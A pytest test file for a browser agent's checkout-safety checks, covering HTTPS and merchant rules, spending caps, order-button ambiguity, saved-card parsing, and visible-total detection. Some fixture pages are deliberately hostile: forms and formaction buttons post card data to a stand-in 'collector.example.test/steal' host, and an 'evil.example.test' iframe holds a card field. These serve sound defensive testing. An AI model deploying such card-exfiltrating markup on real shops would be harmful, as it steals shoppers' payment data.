"""Checkout page facts: the pure rule table (``classify_facts``) with
dataclasses, the outline digest, the strict reading of a card on file,
and ``collect_checkout_facts`` against checkout pages served into
headless Chromium by route interception on an https origin (the same
markup as the fake site's /checkout pages, and a review page that pays
with the card the shop keeps on file), so the scheme and origin rules
are exercised without any network."""

from __future__ import annotations

import dataclasses
from decimal import Decimal
from typing import Any

import pytest

from services.tools.browser.checkout import facts as factsmod
from services.tools.browser.checkout.amounts import Money
from services.tools.browser.checkout.facts import (
    CardFields,
    CheckoutFacts,
    SubmitTarget,
    classify_facts,
    collect_checkout_facts,
    outline_digest,
)

ORIGIN = "https://shop.example.test"
CARD = CardFields(
    number_ref="e12", cvc_ref="e16", exp_ref="e14", exp_month_ref=None, exp_year_ref=None,
    name_ref="e10", frame_origin=ORIGIN, form=0,
)
USD = lambda amount: Money(Decimal(amount), "USD")  # noqa: E731


def facts(**over: Any) -> CheckoutFacts:
    base = CheckoutFacts(
        url=f"{ORIGIN}/checkout",
        origin=ORIGIN,
        host="shop.example.test",
        scheme="https",
        title="Checkout",
        total=Money(Decimal("23.40"), "USD"),
        totals_seen=("Total: $23.40",),
        items=("Concert ticket — $19.00", "Service fee — $4.40"),
        card_fields=CARD,
        submit_ref="e17",
        outline_digest="a" * 40,
        totals=(Money(Decimal("23.40"), "USD"),),
        submit_target=SubmitTarget(action=f"{ORIGIN}/pay", method="post"),
    )
    return dataclasses.replace(base, **over)


def classify(page: CheckoutFacts, **over: Any):
    kw: dict[str, Any] = {
        "expected_merchant": "shop.example.test",
        "model_amount": None,
        "per_purchase_cap": Decimal("25"),
        "per_day_cap": Decimal("50"),
        "spent_today": Decimal("0"),
    }
    kw.update(over)
    return classify_facts(page, **kw)


# ── classify_facts: one rule at a time, in order ─────────────────────────


def test_a_good_checkout_passes():
    assert classify(facts()) is None
    assert classify(facts(), model_amount=Decimal("20")) is None  # the page total is what counts


@pytest.mark.parametrize("scheme", ["http", "", "file", "about"])
def test_insecure_page_comes_first(scheme):
    rule, message = classify(facts(scheme=scheme, total=None, card_fields=None), expected_merchant="x")
    assert rule == "insecure_page" and "HTTPS" in message


def test_merchant_mismatch():
    rule, message = classify(facts(total=None), expected_merchant="amazon.com")
    assert rule == "merchant_mismatch" and "amazon.com" in message and "shop.example.test" in message


def test_no_total_then_currency():
    rule, message = classify(facts(total=None, card_fields=None))
    assert rule == "no_total" and "total" in message.lower()
    rule, message = classify(facts(total=Money(Decimal("23.40"), "EUR"), card_fields=None))
    assert rule == "currency" and "EUR" in message


def test_no_card_fields_and_no_order_button():
    rule, message = classify(facts(card_fields=None))
    assert rule == "no_card_fields" and "card number" in message
    rule, message = classify(facts(submit_ref=None))
    assert rule == "no_card_fields" and "order button" in message


def test_over_cap_uses_the_larger_of_page_total_and_model_amount():
    rule, message = classify(facts(total=Money(Decimal("99"), "USD")))
    assert rule == "over_cap" and "$99.00" in message and "$25.00" in message
    rule, message = classify(facts(), model_amount=Decimal("30"))
    assert rule == "over_cap" and "$30.00" in message and "you expected $30.00" in message
    assert classify(facts(), per_purchase_cap=Decimal("23.40")) is None
    assert classify(facts(total=Money(Decimal("23.41"), "USD")), per_purchase_cap=Decimal("23.40"))[0] == "over_cap"


def test_more_than_one_visible_total_is_ambiguous_and_refused():
    """Two total lines that disagree: the checkout is refused before the
    currency and cap rules, naming both amounts; the same amount twice
    (a summary row and its cell) is one total."""
    rule, message = classify(facts(totals=(USD("23.40"), USD("1.00"))))
    assert rule == "ambiguous_total" and "$23.40" in message and "$1.00" in message
    rule, _ = classify(facts(totals=(USD("23.40"), Money(Decimal("23.40"), "EUR"))))
    assert rule == "ambiguous_total"
    assert classify(facts(totals=(USD("23.40"), USD("23.40")))) is None
    assert classify(facts(totals=())) is None  # only the one total is known


def test_the_caps_see_the_largest_visible_total():
    rule, message = classify(facts(total=USD("1.00"), totals=(USD("99.00"), USD("1.00"))))
    assert rule == "ambiguous_total"
    # Were the same amount somehow picked twice, the cap still sees the max.
    rule, message = classify(facts(total=USD("1.00"), totals=(USD("99.00"),)))
    assert rule == "over_cap" and "$99.00" in message


@pytest.mark.parametrize(
    "target, words",
    [
        (SubmitTarget("http://shop.example.test/pay", "post"), "over http"),
        (SubmitTarget("https://collector.example.test/steal", "post"), "collector.example.test/steal"),
        (SubmitTarget("https://shop.example.test/pay", "get"), "get method instead of POST"),
        (SubmitTarget("https://shop.example.test/pay", ""), "no method instead of POST"),
    ],
)
def test_an_order_form_that_would_send_the_card_elsewhere_is_refused(target, words):
    rule, message = classify(facts(submit_target=target))
    assert rule == "submit_target" and words in message and "shop.example.test" in message


def test_an_order_form_posting_to_this_site_or_the_payment_frame_passes():
    assert classify(facts(submit_target=SubmitTarget(f"{ORIGIN}/pay", "post"))) is None
    framed = dataclasses.replace(CARD, frame_origin="https://pay.example.test")
    assert classify(facts(card_fields=framed, submit_target=SubmitTarget("https://pay.example.test/charge", "post"))) is None
    assert classify(facts(submit_target=SubmitTarget("", ""))) is None  # a scripted submit: no form target
    assert classify(facts(submit_target=None)) is None


ON_FILE = {
    "card_fields": None,
    "saved_payment": True,
    "order_buttons": 1,
    "submit_target": SubmitTarget(action=f"{ORIGIN}/place-order", method="post"),
}


def on_file(**over: Any) -> CheckoutFacts:
    return facts(**{**ON_FILE, **over})


def test_a_page_that_pays_with_the_card_on_file_passes_like_a_card_form():
    assert classify(on_file()) is None
    assert classify(on_file(submit_target=SubmitTarget("", ""))) is None  # a script button
    rule, message = classify(on_file(total=USD("99")))
    assert rule == "over_cap" and "$99.00" in message


def test_a_page_with_neither_card_fields_nor_a_saved_method_names_both_ways_to_pay():
    rule, message = classify(on_file(saved_payment=False, order_buttons=0, submit_ref=None))
    assert rule == "no_card_fields" and "card number" in message and "saved at the site" in message


def test_an_order_button_with_no_saved_method_on_screen_says_to_scroll_to_it():
    rule, message = classify(on_file(saved_payment=False))
    assert rule == "no_card_fields" and message == (
        "This page has an order button but no payment method saved at the site on screen beside "
        "the order total. If the page shows one elsewhere, scroll so the payment method and the "
        "order total show together and try again; if not, open the payment step with the card "
        "fields."
    )


@pytest.mark.parametrize("saved", [True, False])
@pytest.mark.parametrize(
    "where, message",
    [
        (
            "frame",
            "The card fields on this page are in a part of the page Crawler cannot fill, so "
            "Crawler will not pay here.",
        ),
        (
            "page",
            "This page asks for a card number or security code that Crawler cannot fill here, so "
            "Crawler will not pay here.",
        ),
        (
            "unchecked",
            "This page has more fields than Crawler checks, so Crawler cannot tell whether it asks "
            "for a card and will not pay here.",
        ),
    ],
)
def test_card_fields_crawler_cannot_fill_never_let_the_page_pay_with_the_card_on_file(
    saved, where, message
):
    """A card number or code field Crawler does not fill (in a frame it
    does not trust, or in the page without its pair), or more fields than
    it reads, means the page may ask for a card: the saved method next to
    it does not make it a card-on-file page."""
    found = on_file(saved_payment=saved, stray_card_fields=where)
    assert classify(found) == ("no_card_fields", message)


def test_order_summary_rows_are_not_items():
    rows = [
        "Chain wax lube $20.00", "Items: $20.00", "Items (2): $40.00", "Shipping & handling: $3.40",
        "Estimated tax to be collected: $1.20", "Tax $1.00", "Promotion applied: -$2.00",
        "Discount -$1.00", "Total before tax: $23.40", "Order total: $23.40",
        "Chain wax lube — $23.40 · FREE Shipping",
    ]
    assert factsmod._pick_items(rows) == (
        "Chain wax lube $20.00", "Chain wax lube — $23.40 · FREE Shipping",
    )


def control(
    ref: str, name: str, *, role: str = "button", main: bool = True, form: int = -1,
    action: str = f"{ORIGIN}/place-order",
) -> dict[str, Any]:
    """A button or link as the page script describes it; one in a form is
    a POST submit to *action* (the shop's /place-order)."""
    in_form = form >= 0
    return {
        "ref": ref, "name": name, "label": name, "role": role, "main": main, "form": form,
        "submit": in_form and role == "button", "action": action if in_form else "",
        "method": "post" if in_form else "", "disabled": False, "reattached": False,
    }


def test_every_control_that_could_place_the_order_counts_against_the_one_order_button():
    """Only a button in the page itself in the order words is pressed, but
    any button or link in any frame whose words could place an order is a
    rival: two rivals is ambiguous. A control that changes, adds or picks a
    way to pay, an "Order summary" toggle and links that only start with
    the verb ("Order details", "Pay in 4 interest-free payments") are no
    rivals."""
    place = control("e1", "Place your order", form=0)
    bystanders = [
        control("e2", "Change payment method"), control("e3", "Payment options", role="link"),
        control("e4", "Order summary"), control("e5", "Order details", role="link"),
        control("e6", "Pay in 4 interest-free payments", role="link"),
        control("e7", "Pay with a gift card"), control("e8", "Edit payment"),
        control("e9", "Use this payment method"), control("e10", "Remove"),
    ]
    assert factsmod._order_button([place, *bystanders], posts=[post(place)]) == (place, 1)
    rivals = [
        control("e11", "Buy now", form=1), control("e12", "Pay $23.40", form=2),
        control("e13", "Purchase"), control("e14", "Place your order", role="link"),
        control("e15", "Checkout", role="link"), control("e16", "Pay $23.40", role="link"),
        control("e17", "Order now"), control("e18", "Buy"), control("e19", "Complete payment"),
        control("e20", "Confirm & pay"), control("e21", "Submit payment"),
        control("f1e22", "Buy now", main=False), control("f1e23", "Place your order", main=False),
    ]
    for rival in rivals:
        assert factsmod._order_button([place, rival]) == (None, 2), rival["name"]
    # A link and a frame's button are counted, never pressed.
    assert factsmod._order_button([control("e14", "Place your order", role="link")]) == (None, 0)
    assert factsmod._order_button([control("f1e23", "Place your order", main=False, form=0)]) == (
        None, 0,
    )


def post(button: dict[str, Any]) -> tuple[str, str]:
    """A submit button as the page script lists it among ``posts``."""
    return (button["action"], button["name"].lower())


def test_any_other_post_forms_submit_button_makes_the_one_order_button_ambiguous():
    """The real order button may say only "Continue": any other submit
    button of a POST form in the page is a rival whatever it says, so an
    upsell's "Buy now" is never the button the card pays with, even one
    that posts to the order's own address (a hidden sku, or a second button
    of the same form). The order button repeated is no rival."""
    real = f"{ORIGIN}/place-order"
    upsell = control("e1", "Buy now", form=0, action=f"{ORIGIN}/buy-upsell")
    assert factsmod._order_button([upsell], posts=[post(upsell), (real, "continue")]) == (None, 2)
    same_target = control("e4", "Buy now", form=0)
    assert factsmod._order_button([same_target], posts=[post(same_target), (real, "continue")]) == (None, 2)
    place = control("e2", "Place your order", form=0)
    assert factsmod._order_button([place], posts=[post(place)]) == (place, 1)
    assert factsmod._order_button([place], posts=[post(place), (f"{ORIGIN}/sign-out", "sign out")]) == (None, 2)
    # A script order button has no form: every POST form's button is another.
    script = control("e3", "Place your order")
    assert factsmod._order_button([script], posts=[]) == (script, 1)
    assert factsmod._order_button([script], posts=[(real, "place your order")]) == (None, 2)


@pytest.mark.parametrize(
    "count, words", [(0, "no button that places the order"), (2, "more than one order button")]
)
def test_a_saved_method_needs_exactly_one_order_button(count, words):
    rule, message = classify(on_file(submit_ref=None, order_buttons=count))
    assert rule == "no_card_fields" and words in message


def test_an_order_button_on_file_that_would_send_the_order_elsewhere_is_refused():
    away = SubmitTarget("https://collector.example.test/steal", "post")
    rule, message = classify(on_file(submit_target=away))
    assert rule == "submit_target" and "send the order" in message and "card" not in message
    rule, _ = classify(on_file(submit_target=SubmitTarget(f"{ORIGIN}/place-order", "get")))
    assert rule == "submit_target"


@pytest.mark.parametrize(
    "shown, label",
    [
        (["Paying with Visa ending in 4242"], "Visa ····4242"),
        (["MasterCard ending in 5555"], "Mastercard ····5555"),
        (["Amex ····1005"], "American Express ····1005"),
        (["American  Express •••• 1005"], "American Express ····1005"),
        (["Diners Club ending in 3237"], "Diners Club ····3237"),
        (["Visa ending in 4242"] * 2, "Visa ····4242"),  # the same card twice
        (["Visa ending in 4242", "Mastercard ending in 5555"], ""),  # which one pays is not said
        (["Visa ending 4242"], ""),  # not the strict shape
        (["Visa ending in 42424"], ""),  # five digits are no last four
        (["Gift card ending in 4242"], ""),  # no card network named
        (["Visa ending in 4242 <script>"], "Visa ····4242"),  # nothing after the digits is kept
        ("Visa ending in 4242", ""),  # not the page's answer shape
        # A network then its last four, only right after "paying with" or
        # "pay with" (Amazon's "Paying with Visa 1234").
        (["Paying with Visa 1234"], "Visa ····1234"),
        (["Paying with Visa 1234."], "Visa ····1234"),
        (["Pay with Mastercard 5555"], "Mastercard ····5555"),
        # The four digits end the phrase: a street number or a year after
        # the network is not the card's.
        (["Paying with Visa 1234 Main St"], ""),
        (["Pay with Visa 2026 rewards: 3% back"], ""),
        (["Paying with Visa 1234", "Visa ending in 1234"], "Visa ····1234"),
        (["Visa 1234"], ""),
        (["Paying with Visa 12345"], ""),
        (["Paying with gift card 1234"], ""),
    ],
)
def test_the_card_on_file_is_named_only_in_the_strict_shape(shown, label):
    assert factsmod._saved_card(shown) == label


def test_over_daily_cap_adds_what_was_spent():
    rule, message = classify(facts(), spent_today=Decimal("30"))
    assert rule == "over_daily_cap" and "$53.40" in message and "$30.00" in message and "$50.00" in message
    assert classify(facts(), spent_today=Decimal("26.60")) is None
    assert classify(facts(), spent_today=Decimal("26.61"))[0] == "over_daily_cap"


# ── outline digest ─────────────────────────────────────────────────────────


def test_outline_digest_ignores_text_values_focus_and_state_but_not_structure():
    """The digest the purchase card is tied to is the page memory's, the
    one browser.act's card uses: a ticking timer, a moved focus or a
    ticked box is the same page (a changed total is caught by the
    toolkit's own comparison)."""
    lines = [
        '- heading "Checkout" [level=1] [ref=e2]',
        "- text: Cart expires in 9:59",
        '- listitem [ref=e4]: Concert ticket — $19.00',
        '- textbox "Card number" [active] [ref=e12]',
        '- checkbox "Gift wrap" [checked] [ref=e15]',
        '- button "Place order" [ref=e17]',
    ]
    digest = outline_digest(lines)
    assert len(digest) == 40
    ticking = [
        line.replace("9:59", "9:58").replace("$19.00", "$18.00").replace(" [active]", "").replace(" [checked]", "")
        for line in lines
    ]
    assert outline_digest(ticking) == digest
    assert outline_digest(lines[:-1]) != digest
    assert outline_digest([*lines, '- link "Remove" [ref=e18]']) != digest
    assert outline_digest([line.replace("e12", "e13") for line in lines]) != digest


# ── collect_checkout_facts on served pages (headless Chromium) ─────────────


def html(title: str, body: str) -> str:
    return f"<!doctype html><html><head><title>{title}</title></head><body>{body}</body></html>"


ITEMS = '<ul class="items"><li>Concert ticket — $19.00</li><li>Service fee — $4.40</li></ul>'
CARD_FORM = """<form method="post" action="/pay">
<label>Name on card <input name="cc-name" autocomplete="cc-name"></label>
<label>Card number <input name="cc-number" autocomplete="cc-number"></label>
<label>Expiry <input name="cc-exp" autocomplete="cc-exp" placeholder="MM/YY"></label>
<label>CVC <input name="cc-csc" autocomplete="cc-csc"></label>
<button type="submit">Place order</button>
</form>"""


def checkout(total: str) -> str:
    total_line = f'<p id="total">Total: {total}</p>' if total else ""
    return html("Checkout", f"<h1>Checkout</h1>{ITEMS}<p>Subtotal $19.00</p>{total_line}{CARD_FORM}")


PAGES: dict[str, str] = {
    "/checkout": checkout("$23.40"),
    "/checkout-eur": checkout("€23,40"),
    "/checkout-no-total": checkout(""),
    "/checkout-big": checkout("$99.00"),
    "/checkout-table": html(
        "Checkout",
        """<h1>Checkout</h1>
<table><tr class="line-item"><td>Concert ticket</td><td>$19.00</td></tr>
<tr class="line-item"><td>Service fee</td><td>$4.40</td></tr>
<tr><td>Subtotal</td><td>$19.00</td></tr><tr><th>Order total</th><td>$23.40</td></tr></table>
<div><span>Total items: 2</span> <span>Total savings $5.00</span></div>
<form method="post" action="/pay">
<label>Cardholder <input name="holder"></label>
<label>Card number <input name="cardnumber" type="tel"></label>
<label>Month <select name="expmonth"><option value="01">01</option><option value="12">12</option></select></label>
<label>Year <select name="expyear"><option value="2027">2027</option><option value="2028">2028</option></select></label>
<label>Security code <input name="cvv" type="password"></label>
<button type="button">Apply promo code</button>
<button type="submit">Pay now</button>
</form>
<iframe src="https://evil.example.test/card" width="300" height="60"></iframe>""",
    ),
    "/checkout-framed": html(
        "Checkout",
        """<h1>Checkout</h1><p>Total $23.40</p>
<iframe src="https://pay.example.test/card" width="600" height="120"></iframe>
<button>Pay</button>""",
    ),
    "/checkout-hidden-total": html(
        "Checkout",
        '<h1>Checkout</h1><p style="display:none">Total $999.00</p><p>Total: $23.40</p>' + CARD_FORM,
    ),
    # Totals the owner cannot see on the screenshot: off to the left,
    # below the fold, inside a clipped box, under an overlay.
    "/checkout-unseen-totals": html(
        "Checkout",
        '<h1>Checkout</h1><p>Total: $23.40</p>' + CARD_FORM
        + '<p style="position:absolute;left:-10000px">Order total $1.00</p>'
        + '<div style="height:0;overflow:hidden"><p>Grand total $2.00</p></div>'
        + '<p style="position:absolute;top:400px;left:0;margin:0">Total $3.00</p>'
        + '<div style="position:fixed;top:390px;left:0;width:100%;height:40px;background:#fff"></div>'
        + '<div style="height:1500px"></div><p>Cart total $4.00</p>',
    ),
    # Two total lines, the nearer one next to the card form.
    "/checkout-two-totals": html(
        "Checkout",
        '<h1>Checkout</h1><p>Total: $23.40</p><div style="height:300px"></div>'
        '<p>Amount due $23.40</p>' + CARD_FORM,
    ),
    # A button attached from outside the card form with form=.
    "/checkout-formaction": html(
        "Checkout",
        '<h1>Checkout</h1><p>Total: $23.40</p>'
        '<button type="submit" form="pay" formaction="https://collector.example.test/steal">Place order</button>'
        + CARD_FORM.replace('<form method="post" action="/pay">', '<form method="post" action="/pay" id="pay">'),
    ),
    # The card form's own button points elsewhere through formaction.
    "/checkout-own-formaction": html(
        "Checkout",
        '<h1>Checkout</h1><p>Total: $23.40</p>'
        + CARD_FORM.replace(
            '<button type="submit">Place order</button>',
            '<button type="submit" formaction="https://collector.example.test/steal">Place order</button>',
        ),
    ),
    # A final review page that pays with the card the shop keeps on file:
    # no card field, the saved card next to the total, one order button
    # (Amazon's shape, which repeats it at the foot of the same form).
    "/review": html(
        "Review your order",
        "<h1>Review your order</h1><p>Paying with Visa ending in 4242</p>" + ITEMS
        + '<p>Order total: $23.40</p><form method="post" action="/place-order">'
        '<button type="submit">Place your order</button>'
        '<button type="button">Apply gift card</button><p>Order total: $23.40</p>'
        '<button type="submit">Place your order</button></form>',
    ),
}
ORDER_TAIL = (
    '<p>Order total: $23.40</p><form method="post" action="/place-order">'
    '<button type="submit">Place your order</button></form>'
)


def review(paying: str, *, gap: str = "") -> str:
    """A review page with *paying* as its payment line, *gap* between it
    and the items, the order total and the one order button."""
    return html("Review your order", f"<h1>Review your order</h1><p>{paying}</p>{gap}{ITEMS}{ORDER_TAIL}")


PAGES.update({
    "/review-paying-plain": review("Paying with Visa 1234"),
    "/review-pay-with": review("Pay with Mastercard 5555"),
    # Card text the owner cannot read as the way this order is paid.
    "/review-sign-in-link": review("<a href='/login'>Sign in to use a saved card</a>"),
    "/review-promo": review("Free shipping offer ending in 2026"),
    "/review-card-in-button": review("<button type='button'>Visa ending in 4242</button>"),
    "/review-offscreen-card": review(
        '<span style="position:absolute;left:-10000px">Paying with Visa ending in 4242</span>'
    ),
    "/review-transparent-card": review('<span style="opacity:0">Paying with Visa ending in 4242</span>'),
    "/review-far-card": review("Paying with Visa ending in 4242", gap='<div style="height:420px"></div>'),
    # Words that say there is no saved card.
    "/review-no-saved-cards": review("You have no saved cards."),
    "/review-no-card-on-file": review("No payment method on file. Add a card to continue."),
    "/review-none-saved": review("You don't have any saved cards yet."),
    # One card repeated five times, then a second one.
    "/review-repeats": review("Visa ending in 4242. " * 5 + "Backup: Mastercard ending in 5555."),
    # A saved card, and a card number field the page asks to fill again.
    "/review-number-only": review(
        "Paying with Visa ending in 4242",
        gap='<label>Re-enter card number <input name="cc-number" autocomplete="cc-number"></label>',
    ),
})
FRAME_PAGES: dict[str, str] = {
    "https://evil.example.test/card": html("Card", '<input autocomplete="cc-number" name="n">'),
    "https://pay.example.test/card": html(
        "Card",
        '<input autocomplete="cc-number" name="n"><input autocomplete="cc-exp" name="e">'
        '<input autocomplete="cc-csc" name="c">',
    ),
}


async def serve(page, origin: str = ORIGIN) -> None:
    async def handler(route, request):
        url = request.url
        if url in FRAME_PAGES:
            await route.fulfill(status=200, content_type="text/html; charset=utf-8", body=FRAME_PAGES[url])
            return
        path = url.split("//", 1)[1].split("/", 1)[1] if "/" in url.split("//", 1)[1] else ""
        body = PAGES.get("/" + path)
        if body is None:
            await route.fulfill(status=404, content_type="text/plain", body="not found")
            return
        await route.fulfill(status=200, content_type="text/html; charset=utf-8", body=body)

    await page.route("**/*", handler)


@pytest.mark.asyncio
async def test_facts_of_the_checkout_page(page):
    await serve(page)
    await page.goto(f"{ORIGIN}/checkout", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.url == f"{ORIGIN}/checkout" and found.origin == ORIGIN
    assert found.host == "shop.example.test" and found.scheme == "https" and found.title == "Checkout"
    assert found.total == Money(Decimal("23.40"), "USD")
    assert found.totals_seen == ("Total: $23.40",)
    assert found.items == ("Concert ticket — $19.00", "Service fee — $4.40")
    card = found.card_fields
    assert card is not None and card.frame_origin == ORIGIN
    refs = {card.number_ref, card.cvc_ref, card.exp_ref, card.name_ref}
    assert len(refs) == 4 and all(r and r.startswith("e") for r in refs)
    assert card.exp_month_ref is None and card.exp_year_ref is None
    assert found.submit_ref and found.submit_ref not in refs
    assert len(found.outline_digest) == 40
    # The refs are the live snapshot's: they resolve to the right inputs.
    assert await page.locator(f"aria-ref={card.number_ref}").get_attribute("name") == "cc-number"
    assert await page.locator(f"aria-ref={card.cvc_ref}").get_attribute("name") == "cc-csc"
    assert await page.locator(f"aria-ref={found.submit_ref}").inner_text() == "Place order"
    assert classify_facts(
        found, expected_merchant="shop.example.test", model_amount=None,
        per_purchase_cap=Decimal("25"), per_day_cap=Decimal("50"), spent_today=Decimal("0"),
    ) is None


@pytest.mark.asyncio
async def test_no_total_and_foreign_currency(page):
    await serve(page)
    await page.goto(f"{ORIGIN}/checkout-no-total", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.total is None and found.totals_seen == ()
    assert found.card_fields is not None  # the subtotal never counts as the total
    await page.goto(f"{ORIGIN}/checkout-eur", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.total == Money(Decimal("23.40"), "EUR")


@pytest.mark.asyncio
async def test_named_fields_selects_table_rows_and_a_foreign_frame(page):
    await serve(page)
    await page.goto(f"{ORIGIN}/checkout-table", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.total == Money(Decimal("23.40"), "USD")  # "Total items"/"Total savings" never
    assert found.items == ("Concert ticket $19.00", "Service fee $4.40")
    card = found.card_fields
    assert card is not None and card.exp_ref is None
    assert await page.locator(f"aria-ref={card.number_ref}").get_attribute("name") == "cardnumber"
    assert await page.locator(f"aria-ref={card.cvc_ref}").get_attribute("name") == "cvv"
    assert await page.locator(f"aria-ref={card.exp_month_ref}").get_attribute("name") == "expmonth"
    assert await page.locator(f"aria-ref={card.exp_year_ref}").get_attribute("name") == "expyear"
    assert await page.locator(f"aria-ref={card.name_ref}").get_attribute("name") == "holder"
    assert await page.locator(f"aria-ref={found.submit_ref}").inner_text() == "Pay now"


@pytest.mark.asyncio
async def test_card_fields_in_a_payment_provider_frame_count_and_others_do_not(page, monkeypatch):
    await serve(page)
    await page.goto(f"{ORIGIN}/checkout-framed", wait_until="domcontentloaded")
    await page.frames[1].wait_for_selector("input")
    assert (await collect_checkout_facts(page)).card_fields is None  # an unknown frame host
    monkeypatch.setattr(
        factsmod, "PAYMENT_FRAME_HOSTS", (*factsmod.PAYMENT_FRAME_HOSTS, "pay.example.test")
    )
    found = await collect_checkout_facts(page)
    card = found.card_fields
    assert card is not None and card.frame_origin == "https://pay.example.test"
    assert card.number_ref.startswith("f") and card.exp_ref and card.cvc_ref
    assert found.submit_ref is not None  # named like an order button, outside any form


@pytest.mark.asyncio
async def test_hidden_totals_are_not_read_and_http_is_reported(page):
    await serve(page)
    await page.goto(f"{ORIGIN}/checkout-hidden-total", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.total == Money(Decimal("23.40"), "USD")
    await page.goto("http://shop.example.test/checkout", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.scheme == "http" and found.origin == "http://shop.example.test"
    assert classify_facts(
        found, expected_merchant="shop.example.test", model_amount=None,
        per_purchase_cap=Decimal("25"), per_day_cap=Decimal("50"), spent_today=Decimal("0"),
    )[0] == "insecure_page"


@pytest.mark.asyncio
async def test_facts_of_a_review_page_that_pays_with_the_card_on_file(page):
    """No card fields: the saved card is read in the strict shape, and the
    same "Place your order" twice in one form to one target is one order
    button, bound to that form's target."""
    await serve(page)
    await page.goto(f"{ORIGIN}/review", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.card_fields is None and found.saved_payment is True
    assert found.saved_card == "Visa ····4242" and found.order_buttons == 1
    assert found.total == Money(Decimal("23.40"), "USD") and len(found.items) == 2
    assert found.submit_target == SubmitTarget(action=f"{ORIGIN}/place-order", method="post")
    assert await page.locator(f"aria-ref={found.submit_ref}").inner_text() == "Place your order"
    assert classify_facts(
        found, expected_merchant="shop.example.test", model_amount=None,
        per_purchase_cap=Decimal("25"), per_day_cap=Decimal("50"), spent_today=Decimal("0"),
    ) is None
    # A card form shows no saved method, and its order button is the form's.
    await page.goto(f"{ORIGIN}/checkout", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.card_fields is not None and found.saved_payment is False
    assert found.order_buttons == 0


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "path, card", [("/review-paying-plain", "Visa ····1234"), ("/review-pay-with", "Mastercard ····5555")]
)
async def test_paying_with_a_card_network_and_its_last_four_is_a_saved_card(page, path, card):
    await serve(page)
    await page.goto(f"{ORIGIN}{path}", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.card_fields is None and found.saved_payment is True
    assert found.saved_card == card and found.order_buttons == 1
    assert classify(found) is None


@pytest.mark.asyncio
@pytest.mark.parametrize(
    "path",
    [
        "/review-sign-in-link", "/review-promo", "/review-card-in-button", "/review-offscreen-card",
        "/review-transparent-card", "/review-far-card", "/review-no-saved-cards",
        "/review-no-card-on-file", "/review-none-saved",
    ],
)
async def test_card_words_the_owner_cannot_read_as_what_pays_this_order_are_no_saved_method(page, path):
    """A link or a button, a promo line, text off screen or transparent,
    a card named far from the order total and the order button, and words
    that say there is no saved card: none makes the page a card-on-file
    page, and none puts digits on the card."""
    await serve(page)
    await page.goto(f"{ORIGIN}{path}", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.total == USD("23.40") and found.order_buttons == 1
    assert found.saved_payment is False and found.saved_card == ""
    rule, message = classify(found)
    assert rule == "no_card_fields" and "saved at the site" in message


@pytest.mark.asyncio
async def test_one_card_repeated_does_not_hide_a_second_card(page):
    await serve(page)
    await page.goto(f"{ORIGIN}/review-repeats", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.saved_payment is True and found.saved_card == ""


@pytest.mark.asyncio
async def test_a_card_field_crawler_cannot_fill_is_reported_in_any_frame(page):
    await serve(page)
    await page.goto(f"{ORIGIN}/checkout-framed", wait_until="domcontentloaded")
    await page.frames[1].wait_for_selector("input")
    found = await collect_checkout_facts(page)
    assert found.card_fields is None and found.stray_card_fields == "frame"
    await page.goto(f"{ORIGIN}/review-number-only", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.card_fields is None and found.saved_payment is True and found.stray_card_fields == "page"
    rule, message = classify(found)
    assert rule == "no_card_fields" and "cannot fill" in message
    for path in ("/review", "/checkout"):
        await page.goto(f"{ORIGIN}{path}", wait_until="domcontentloaded")
        assert (await collect_checkout_facts(page)).stray_card_fields == "", path


@pytest.mark.asyncio
async def test_the_order_button_is_found_after_the_tab_has_loaded_other_pages(page):
    """After a navigation the main frame's refs carry a frame prefix too
    (``f2e8``): the page itself says which frame is the main one."""
    await serve(page)
    for path in ("/checkout", "/review", "/checkout-framed", "/review"):
        await page.goto(f"{ORIGIN}{path}", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.submit_ref is not None and found.submit_ref.startswith("f"), found.submit_ref
    assert found.order_buttons == 1 and found.saved_payment is True and found.stray_card_fields == ""
    assert await page.locator(f"aria-ref={found.submit_ref}").inner_text() == "Place your order"
    assert classify(found) is None


@pytest.mark.asyncio
async def test_a_page_that_will_not_answer_reports_nothing(page, monkeypatch):
    await serve(page)
    await page.goto(f"{ORIGIN}/checkout", wait_until="domcontentloaded")
    monkeypatch.setattr(factsmod, "FACTS_TIMEOUT_S", 0.0)
    found = await collect_checkout_facts(page)
    assert found.total is None and found.card_fields is None and found.submit_ref is None
    assert found.items == () and found.origin == ORIGIN and found.outline_digest


@pytest.mark.asyncio
async def test_only_totals_the_owner_can_see_count(page):
    """Off-screen, clipped, covered and below-the-fold totals are not
    candidates: the one on screen is the total, unambiguously."""
    await serve(page)
    await page.goto(f"{ORIGIN}/checkout-unseen-totals", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.total == Money(Decimal("23.40"), "USD") and found.totals == (Money(Decimal("23.40"), "USD"),)
    assert found.totals_seen == ("Total: $23.40",)
    # Scrolled down, the total below the fold is the one on screen.
    await page.mouse.wheel(0, 5000)
    await page.wait_for_timeout(100)
    found = await collect_checkout_facts(page)
    assert found.total == Money(Decimal("4.00"), "USD") and found.totals == (Money(Decimal("4.00"), "USD"),)


@pytest.mark.asyncio
async def test_the_total_nearest_the_card_form_is_preferred(page):
    await serve(page)
    await page.goto(f"{ORIGIN}/checkout-two-totals", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
    assert found.total == Money(Decimal("23.40"), "USD")
    assert found.totals_seen[0] == "Total: $23.40" and "Amount due $23.40" in found.totals_seen
    assert len(found.totals) == 1


@pytest.mark.asyncio
async def test_the_order_button_comes_from_the_card_form_itself(page):
    """A button attached through form= from outside is never the order
    button; the form's own button and its target are what the card binds
    to, and a formaction on that button is read as the target."""
    await serve(page)
    await page.goto(f"{ORIGIN}/checkout", wait_until="domcontentloaded")
    found = await collect_checkout_facts(page)
